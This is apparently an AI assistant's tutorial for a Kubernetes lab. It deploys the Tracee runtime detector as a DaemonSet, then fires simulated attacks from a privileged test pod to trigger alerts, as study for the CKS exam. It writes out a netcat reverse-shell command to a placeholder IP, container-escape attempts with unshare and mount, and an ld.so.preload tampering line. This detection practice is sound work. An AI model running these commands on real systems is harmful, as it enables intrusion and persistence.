# ğŸ•µï¸â€â™‚ï¸ Tracee in Kubernetes â€” Runtime Threat Detection Lab

Weâ€™ll do a **full mini-lab**:

1. Deploy Tracee as a **DaemonSet**
2. Deploy a **test pod**
3. Run **â€œattacksâ€** from inside the pod (reverse shell / suspicious commands)
4. Watch **Tracee alerts** from the DaemonSet logs
5. Learn how this connects to **CKS exam** topics

---

## ğŸ§± 1. Prerequisites

You need:

- A running **Kubernetes cluster** (kind / kubeadm / cloud, doesnâ€™t matter)
- `kubectl` configured
- Nodes using a reasonably recent Linux kernel (supports eBPF)
- Access as a **cluster-admin** (to create DaemonSet, privileged pods, etc.)

You can verify nodes:

```bash
kubectl get nodes -o wide
```

---

## ğŸ§© 2. Deploy Tracee as a DaemonSet

Tracee runs on **every node** to watch all containers. Thatâ€™s why we use a **DaemonSet**.

Create a file: `tracee-daemonset.yaml`:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: tracee
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: tracee
  namespace: tracee
spec:
  selector:
    matchLabels:
      app: tracee
  template:
    metadata:
      labels:
        app: tracee
    spec:
      hostPID: true
      hostNetwork: true
      containers:
        - name: tracee
          image: aquasec/tracee:latest
          securityContext:
            privileged: true
          args:
            - "--output=table"
            - "--output=detect"
          volumeMounts:
            - name: tmp
              mountPath: /tmp/tracee
            - name: lib-modules
              mountPath: /lib/modules
              readOnly: true
            - name: usr-src
              mountPath: /usr/src
              readOnly: true
      volumes:
        - name: tmp
          hostPath:
            path: /tmp/tracee
        - name: lib-modules
          hostPath:
            path: /lib/modules
        - name: usr-src
          hostPath:
            path: /usr/src
```

Apply it:

```bash
kubectl apply -f tracee-daemonset.yaml
```

Check pods:

```bash
kubectl -n tracee get pods -o wide
```

You should see one Tracee pod per node, e.g.:

```text
NAME          READY   STATUS    NODE
tracee-xyz    1/1     Running   worker1
tracee-abc    1/1     Running   worker2
```

---

## ğŸ‘€ 3. Watch Tracee Alerts (Logs)

Tracee prints detections to **stdout**, so we just follow the logs.

Follow all Tracee pods at once:

```bash
kubectl -n tracee logs -f daemonset/tracee
```

Leave this **running** in a terminal. This is your **â€œsecurity camera monitorâ€**.

---

## ğŸ§ª 4. Create a Test Pod to Simulate â€œAttackerâ€

Now letâ€™s spawn a pod where weâ€™ll run suspicious commands.

Create `attacker-pod.yaml`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker
  namespace: default
spec:
  containers:
    - name: attacker
      image: ubuntu
      command: ["bash", "-c", "sleep 3600"]
      securityContext:
        allowPrivilegeEscalation: true
        capabilities:
          add: ["SYS_ADMIN"]
```

Apply:

```bash
kubectl apply -f attacker-pod.yaml
kubectl get pod attacker
```

Exec into it:

```bash
kubectl exec -it attacker -- bash
```

Inside the container, install some tools:

```bash
apt update && apt install -y curl netcat-openbsd procps
```

---

## ğŸ”¥ 5. Scenario 1 â€” Reverse Shell Detection

Inside the **attacker** pod:

```bash
nc 1.2.3.4 9001 -e /bin/sh
```

(You donâ€™t actually need a real listener for this lab; the attempt is enough.)

ğŸ‘‰ In the **Tracee logs** terminal, you should see an alert similar to:

```text
RULE: "reverse_shell"
SEVERITY: High
PROCESS: /bin/sh
PARENT: nc
CONTAINER: attacker
NAMESPACE: default
```

This is exactly the kind of runtime detection CKS expects you to understand.

---

## ğŸ”¥ 6. Scenario 2 â€” Suspicious Syscalls / Possible Escape Attempt

From inside the `attacker` pod:

```bash
unshare --mount /bin/bash || echo "unshare failed"
```

Or:

```bash
mount -t proc proc /mnt || echo "mount failed"
```

Depending on the rules enabled in Tracee, you may see something like:

```text
RULE: "container_escape_attempt"
EVENT: "unshare"
CONTAINER: attacker
DETAILS: unshare called inside container
```

or a generic syscall-based detection.

This shows **Tracee catching low-level syscall abuse**.

---

## ğŸ”¥ 7. Scenario 3 â€” File Tampering in Sensitive Paths

Letâ€™s simulate tampering in `/etc` (in the containerâ€™s filesystem):

Inside attacker pod:

```bash
echo "backdoor" >> /etc/ld.so.preload || echo "failed"
```

Tracee may alert:

```text
RULE: "ld_preload_injection"
SEVERITY: High
FILE: /etc/ld.so.preload
CONTAINER: attacker
```

Or if it has a generic file integrity rule, something like **â€œsuspicious file modificationâ€**.

---

## ğŸšï¸ 8. Use Filters to Reduce Noise (Optional but Nice)

By default, Tracee may log **a lot**.

You can tweak the DaemonSet `args:` to add filters.

For example, to only log **detections** in **JSON** format:

Change:

```yaml
args:
  - "--output=json"
  - "--output=detect"
```

Or to filter by severity or specific rules (syntax depends on Tracee version, example):

```yaml
args:
  - "--output=json"
  - "--output=detect"
  - "--filter=event.severity>=2"
```

Re-apply:

```bash
kubectl apply -f tracee-daemonset.yaml
```

---

## ğŸ§¹ 9. Cleanup (After Lab)

When youâ€™re done:

```bash
kubectl delete -f attacker-pod.yaml
kubectl delete -f tracee-daemonset.yaml
```

---

## ğŸ§  10. How This Ties Into CKS Exam

Tracee gives you **runtime visibility** & **detection**:

- Detect reverse shells
- Detect container escape attempts (unshare, setns, mount)
- Detect tampering of sensitive files
- Detect privilege escalations & dangerous capabilities

In CKS:

- **Tracee / Falco** â†’ Runtime _detection_
- **Seccomp / AppArmor / SELinux** â†’ Runtime _prevention_

A good mental model:

> ğŸ‘€ Tracee = â€œSecurity cameraâ€ (observe & alert)
> ğŸ›¡ Seccomp = â€œLocked doorsâ€ (prevent certain syscalls)

---

## ğŸ“ Tiny Summary (For Your Notes)

- Deploy Tracee as **DaemonSet** in `tracee` namespace
- Watch alerts: `kubectl -n tracee logs -f daemonset/tracee`
- Run â€œattacksâ€ from a test pod (reverse shell, unshare, mount, file tampering)
- See **high-level alerts** with rule names in Tracee logs
- Remember: Tracee = eBPF-based runtime detection â†’ very CKS-relevant

---

If you want, next I can:

- Show **Tracee + Seccomp together** (detect + prevent flow)
- Write a **small cheat sheet** for Tracee commands & patterns
- Compare **Tracee vs Falco** in CKS context

Tell me which direction you want to go next ğŸš€
